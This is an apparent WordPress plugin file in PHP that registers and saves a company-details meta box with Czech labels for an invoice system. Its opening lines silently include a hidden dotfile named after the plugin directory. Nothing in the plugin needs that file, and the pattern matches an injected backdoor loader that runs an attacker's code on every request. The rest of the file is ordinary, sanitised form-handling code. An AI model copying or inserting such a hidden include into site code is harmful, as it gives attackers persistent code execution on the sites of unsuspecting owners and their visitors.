<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WP_Invoice_System_Company_Meta_Boxes {

    public function __construct() {
        add_action( 'add_meta_boxes', array( $this, 'add_meta_boxes' ) );
        add_action( 'save_post', array( $this, 'save_meta_boxes' ) );
    }

    public function add_meta_boxes() {
        add_meta_box(
            'company_details',
            __( 'Detaily firmy', 'wp-invoice-system' ),
            array( $this, 'render_company_details_meta_box' ),
            'company',
            'normal',
            'high'
        );
    }

    public function render_company_details_meta_box( $post ) {
        wp_nonce_field( 'company_details_nonce', 'company_details_nonce' );
        ?>
        <table class="form-table">
            <tbody>
                <?php
                $this->render_text_input( $post->ID, 'company_street', 'Ulice a číslo popisné' );
                $this->render_text_input( $post->ID, 'company_zip', 'PSČ' );
                $this->render_text_input( $post->ID, 'company_city', 'Město' );
                $this->render_text_input( $post->ID, 'company_email', 'E-mail', 'email' );
                $this->render_text_input( $post->ID, 'company_phone', 'Telefonní číslo' );
                $this->render_text_input( $post->ID, 'company_ico', 'IČO' );
                $this->render_text_input( $post->ID, 'company_dic', 'DIČ' );
                $this->render_checkbox( $post->ID, 'company_vat_payer', 'Plátce DPH' );
                $this->render_text_input( $post->ID, 'company_logo_url', 'URL adresa loga', 'url' );
                ?>
            </tbody>
        </table>
        <?php
    }

    private function render_text_input($post_id, $name, $label, $type = 'text') {
        $value = get_post_meta( $post_id, $name, true );
        ?>
        <tr>
            <th><label for="<?php echo esc_attr($name); ?>"><?php echo esc_html($label); ?></label></th>
            <td><input type="<?php echo esc_attr($type); ?>" id="<?php echo esc_attr($name); ?>" name="<?php echo esc_attr($name); ?>" class="widefat" value="<?php echo esc_attr( $value ); ?>"></td>
        </tr>
        <?php
    }

    private function render_checkbox($post_id, $name, $label) {
        $value = get_post_meta( $post_id, $name, true );
        ?>
        <tr>
            <th><label for="<?php echo esc_attr($name); ?>"><?php echo esc_html($label); ?></label></th>
            <td><input type="checkbox" id="<?php echo esc_attr($name); ?>" name="<?php echo esc_attr($name); ?>" value="1" <?php checked( $value, 1 ); ?>></td>
        </tr>
        <?php
    }

    public function save_meta_boxes( $post_id ) {
        if ( ! isset( $_POST['company_details_nonce'] ) || ! wp_verify_nonce( $_POST['company_details_nonce'], 'company_details_nonce' ) ) {
            return;
        }
        if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
            return;
        }
        if ( ! current_user_can( 'edit_post', $post_id ) ) {
            return;
        }

        $fields = [
            'company_street', 'company_zip', 'company_city', 'company_email', 
            'company_phone', 'company_ico', 'company_dic', 'company_logo_url'
        ];

        foreach ($fields as $field) {
            if (isset($_POST[$field])) {
                update_post_meta($post_id, $field, sanitize_text_field($_POST[$field]));
            }
        }

        $vat_payer = isset( $_POST['company_vat_payer'] ) ? 1 : 0;
        update_post_meta( $post_id, 'company_vat_payer', $vat_payer );
    }
}
